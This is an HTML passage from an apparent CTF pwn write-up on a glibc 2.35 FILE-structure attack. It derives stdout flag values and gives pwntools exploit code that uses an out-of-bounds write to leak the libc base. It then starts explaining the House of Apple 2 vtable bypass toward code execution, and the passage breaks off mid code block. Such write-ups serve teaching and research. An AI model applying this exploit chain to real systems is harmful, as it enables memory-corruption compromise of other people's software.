<li><code>if (f-&gt;_flags &amp; _IO_NO_WRITES)</code> needs to return False.
<ul>
<li>So, <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L71" target="_blank" rel="noopener"><code>_IO_NO_WRITES</code></a> is <code>0x0008</code>, which mean <code>stdout-&gt;_flags &amp; 0x0008</code> should be <code>0</code></li>
</ul>
</li>
<li><code>if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</code> needs to return False.
<ul>
<li><code>_IO_write_base == NULL</code> will always return False because it points to the libc area.</li>
<li><code>(stdout-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0</code> needs to return False as well. <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L79" target="_blank" rel="noopener"><code>_IO_CURRENTLY_PUTTING</code></a> is <code>0x0800</code>, which mean <code>stdout-&gt;_flags &amp; 0x0800</code> should be <code>1</code></li>
</ul>
</li>
<li><code>if (ch == EOF)</code> needs to return True.
<ul>
<li>This will always be satisfied because <code>puts</code> always set the <code>ch</code> to <code>EOF</code>.</li>
</ul>
</li>
</ul>
</li>
<li>Move to the <code>new_do_write</code>, we need to skip the second <code>if</code> condition, so we need to:
<ul>
<li>Make this <code>if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</code> return True.
<ul>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L80" target="_blank" rel="noopener"><code>_IO_IS_APPENDING</code></a> is <code>0x1000</code>, SO <code>stdout-&gt;_flags &amp; 0x1000</code> should be <code>1</code>.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>So, based on the above constraints, what value that we need to set for the <code>stdout-&gt;_flags</code> is <code>0x1800</code>, so that:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>_flags &amp; _IO_NO_WRITES         == 0
</span></span><span style="display:flex;"><span>_flags &amp; _IO_CURRENTLY_PUTTING == 1
</span></span><span style="display:flex;"><span>_flags &amp; _IO_IS_APPENDING      == 1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, with the OOB bug, we can get a libc leak. What should we do are:</p>
<ul>
<li>Overwrite the <code>stdout-&gt;_flags</code> with <code>0x1800</code></li>
<li>Overwrite the last byte of <code>stdout-&gt;_IO_write_ptr</code> to be larger than <code>stdout-&gt;_IO_write_base</code>.</li>
</ul>
<p>By doing this, we will get a libc leak when the binary prints the menu.</p>
<p>Let&rsquo;s start building our exploit by creating some helpers:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create</span>(r, size, content):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#366">str</span>(size)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">edit</span>(r, offset, val):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#366">str</span>(offset)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#366">bytes</span>([val]))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">exit_binary</span>(r):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
</div><p>And then, allocate a big chunk:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create a big chunk, so that our chunk is located on the newly page</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># created by mmap (To be precise, at libc_base-0xf7ff0)</span>
</span></span><span style="display:flex;"><span>chunk_size      <span style="color:#555">=</span> <span style="color:#f60">1000000</span>
</span></span><span style="display:flex;"><span>offset_to_libc  <span style="color:#555">=</span> <span style="color:#f60">0xf7ff0</span>
</span></span><span style="display:flex;"><span>create(r, chunk_size, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s start overwriting the <code>_flags</code></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Leak libc base via stdout
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Prepare the correct offset for stdout and stderr</span>
</span></span><span style="display:flex;"><span>stdout_offset_from_chunk <span style="color:#555">=</span> offset_to_libc <span style="color:#555">+</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;_IO_2_1_stdout_&#39;</span>]
</span></span><span style="display:flex;"><span>stderr_offset_from_chunk <span style="color:#555">=</span> offset_to_libc <span style="color:#555">+</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;_IO_2_1_stderr_&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Stdout offset: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(stdout_offset_from_chunk)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Stderr offset: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(stderr_offset_from_chunk)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite stdout-&gt;_flags to 0x1800</span>
</span></span><span style="display:flex;"><span>flags_offset <span style="color:#555">=</span> <span style="color:#f60">0x0</span>  <span style="color:#09f;font-style:italic"># stdout-&gt;_flags = &amp;stdout + 0x0</span>
</span></span><span style="display:flex;"><span>flags <span style="color:#555">=</span> p32(<span style="color:#f60">0x1800</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#366">len</span>(flags)):
</span></span><span style="display:flex;"><span>    edit(r, stdout_offset_from_chunk<span style="color:#555">+</span>flags_offset<span style="color:#555">+</span>i, flags[i])
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have successfully overwritten the <code>stdout</code> flags, let&rsquo;s overwrite the <code>_IO_write_ptr</code>. After we do the edit, we will get a libc leak immediately because the binary will print the menu.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite stdout-&gt;_IO_write_ptr to be larger than</span>
</span></span><span style="display:flex;"><span>write_ptr_offset <span style="color:#555">=</span> <span style="color:#f60">0x28</span> <span style="color:#09f;font-style:italic"># stdout-&gt;_IO_write_ptr = &amp;stdout + 0x28</span>
</span></span><span style="display:flex;"><span>write_ptr_lsb    <span style="color:#555">=</span> <span style="color:#f60">0x50</span> <span style="color:#09f;font-style:italic"># You can choose any value. I choose 0x50</span>
</span></span><span style="display:flex;"><span>edit(r, stdout_offset_from_chunk<span style="color:#555">+</span>write_ptr_offset, write_ptr_lsb)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now, when the binary called menu() (which will call puts())</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># It will leak a libc address, which equivalents to _IO_stdfile_1_lock</span>
</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> r<span style="color:#555">.</span>recv(<span style="color:#f60">16</span>)[<span style="color:#f60">5</span>:]
</span></span><span style="display:flex;"><span>leaked_libc <span style="color:#555">=</span> u64(out[:<span style="color:#f60">8</span>])
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked libc  : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_libc)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> leaked_libc<span style="color:#555">-</span>libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;_IO_stdfile_1_lock&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Libc base    : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> libc_base
</span></span><span style="display:flex;"><span>chunk_addr <span style="color:#555">=</span> libc_base <span style="color:#555">-</span> <span style="color:#f60">0xf7ff0</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Chunk addr   : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(chunk_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><p><p class="markdown-image">
  <img src="https://i.imgur.com/XEbTTC0.png" alt=""  />
</p></p>
<p>Above is the result of our current script. So now, we have successfully retrieved a libc leak. Time to move to the next step, which gaining code execution.</p>
<h3 id="gaining-remote-code-execution-rce">Gaining Remote Code Execution (RCE) <a href="#gaining-remote-code-execution-rce" class="anchor">#</a></h3>
<p>Up until now, we have:</p>
<ul>
<li>OOB write to libc area.</li>
<li>Libc base address from the leak.</li>
</ul>
<p>We need to leverage the OOB bug and the libc base address leaked info to gain RCE. One thing that comes in mind is using the knowledge that I gathered from the recent discussion about gaining RIP control from FILE structure attack in Glibc 2.35.</p>
<p>To give some context, in the old version of glibc, we can overwrite the <code>file-&gt;vtable</code> address with our fake <code>vtable</code>, so that let&rsquo;s say when a method wants to call <code>_IO_OVERFLOW</code>, instead of jumping to the correct address, it will jump to our desired address that we set in our fake <code>vtable</code>.</p>
<p>However, this has been mitigated because the glibc will check whether the <code>vtable</code> that is stored in the FILE is in the correct region or not. Check the below LOCs:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#069;font-weight:bold">inline</span> <span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> _IO_jump_t <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#c0f">IO_validate_vtable</span> (<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> _IO_jump_t <span style="color:#555">*</span>vtable)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#09f;font-style:italic">/* Fast path: The vtable pointer is within the __libc_IO_vtables
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">     section.  */</span>
</span></span><span style="display:flex;"><span>  uintptr_t section_length <span style="color:#555">=</span> __stop___libc_IO_vtables <span style="color:#555">-</span> __start___libc_IO_vtables;
</span></span><span style="display:flex;"><span>  uintptr_t ptr <span style="color:#555">=</span> (uintptr_t) vtable;
</span></span><span style="display:flex;"><span>  uintptr_t offset <span style="color:#555">=</span> ptr <span style="color:#555">-</span> (uintptr_t) __start___libc_IO_vtables;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (__glibc_unlikely (offset <span style="color:#555">&gt;=</span> section_length))
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">/* The vtable pointer is not in the expected section.  Use the
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">       slow path, which will terminate the process if necessary.  */</span>
</span></span><span style="display:flex;"><span>    _IO_vtable_check ();
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> vtable;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#099"># define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define _IO_JUMPS_FILE_plus(THIS) \
</span></span></span><span style="display:flex;"><span><span style="color:#099">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Taking example let&rsquo;s say a method tries to call <code>_IO_OVERRFLOW</code>, it will try to do the jump to the stored pointer in the <code>vtable</code> value mapped with key <code>__overflow</code>, and before jumping into it, it will validate first whether the stored pointer is in the valid area or not by calling <code>IO_validate_vtable</code>.</p>
<p>So that trick where we set up our fake <code>vtable</code> to jump to a method outside the <code>vtable</code> section area no longer works. However, because the check only validates whether the stored pointer is in <code>vtable</code> region or not, we can still misalign the table (For example, shift the <code>vtable</code> by one entry, so that when a function called <code>_IO_OVERFLOW</code>, it will jump to <code>_IO_UNDERFLOW</code> instead due to the misalignment).</p>
<p>People try to find a way to abuse this check, and recently in this <a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/" target="_blank" rel="noopener">article</a> by kylebot, he found that the glibc does the check only when jumping with macro <code>_IO_JUMPS_FUNC</code>, but it didn&rsquo;t validate the check when it uses a macro to jump to the <code>wide_vtable</code>, which is <code>_IO_WIDE_JUMPS_FUNC</code>.</p>
<p>Also turns out, there is another article that has been published a few months ago that tried to abuse the same finding from kylebot. The method is called <code>House of Apple 2</code>, which was posted by roderick01 in this <a href="https://bbs.pediy.com/thread-273832.htm" target="_blank" rel="noopener">article</a>. I&rsquo;ll try to explain it in more detail based on my understanding during reading these two blogs.</p>
<p>Remember that the mitigation those were implemented in the recent glibc only checks whether the <code>vtable</code> stored in the FILE properties is still in the correct region or not. And the standard <code>vtable</code> that is being used for <code>stdfile</code> is <code>_IO_file_jumps</code>. But in fact, there is a lot of other <code>vtable</code> in the region that we can use, and one of them is <code>_IO_wfile_jumps</code>. Below is the default entry of the <code>_IO_wfile_jumps</code> printed via <code>gdb</code>:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
